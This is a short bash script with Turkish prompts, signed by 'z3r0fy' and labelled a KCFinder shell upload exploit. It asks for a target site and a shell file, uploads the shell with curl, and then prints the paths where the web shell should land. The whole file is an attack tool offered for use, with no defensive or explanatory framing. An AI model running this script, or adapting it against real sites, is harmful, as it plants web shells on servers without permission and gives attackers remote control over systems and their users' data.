#!/bin/bash

#Coded by z3r0fy

#/kcfinder Shell Upload Exploit

#akincilar.online // ajanlar.org // twitter.com/z3r0fy


clear

echo "***************************************"
echo "
  ____ _  _______           _             
 / ___| |/ /  ___|   _  ___| | _____ _ __ 
| |   | ' /| |_ | | | |/ __| |/ / _ \ '__|
| |___| . \|  _|| |_| | (__|   <  __/ |   
 \____|_|\_\_|   \__,_|\___|_|\_\___|_|   
                                     "
echo "                     Coded by z3r0fy"  
echo "                                    "  
echo "***************************************"

echo -n "Siteyi girin: "; read z0site
echo -n "Yuklenecek shell: "; read z3r0fy

curl -F "file=$z3r0fy" $z0site

echo "***************************************"

echo "shell yuklenme yeri >> /upload/files/$z3r0fy  "

echo "***************************************"

echo "veya"

echo "***************************************"

echo "/userfiles/files/$z3r0fy "

echo "***************************************"

